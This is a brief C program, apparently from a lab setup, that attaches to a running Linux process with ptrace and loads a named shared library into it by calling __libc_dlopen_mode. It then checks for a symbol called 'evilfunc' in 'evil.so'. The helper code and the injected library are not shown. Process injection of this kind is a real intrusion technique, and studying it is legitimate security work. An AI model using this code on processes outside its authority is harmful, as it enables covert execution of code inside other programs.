#include "utils.h"

int
main(int argc, char *argv[])
{
	int pid , len;
	struct  link_map *map;
	struct	user_regs_struct regz;
	ElfW(Addr) sym_addr;
	ElfW(Addr) __libc_dlopen_mode;

	ElfW(Sym) *sym;

	if (argc < 3) {
		printf("usage: %s <pid> <libpath>\n" , argv[0]);
		exit(-1);
	}

	if(open(argv[2], O_RDONLY) < 0) {
		printf("error: no such file\n");
		exit(-1);
	}

	pid = atoi(argv[1]);

	ptrace_attach(pid);
	printf("attached to pid %d\n", pid);	

	/* locate __libc_dlopen_mode() */	

	if(!(__libc_dlopen_mode = find_sym_in_lib(pid, "__libc_dlopen_mode" , "/lib/i386-linux-gnu/libc.so.6"))) {
		printf("error! couldn't find __libc_dlopen_mode() ! :((\n");
		exit(-1);
	}
	inject_code(pid, argv[2], __libc_dlopen_mode);

	if(!( find_sym_in_lib(pid, "evilfunc" , "/vagrant/inject/evil.so"))) {
		printf("[*] inject failed.");
		exit(-1);
	}
	printf("[*] lib injection done!\n");
	ptrace_detach(pid);
}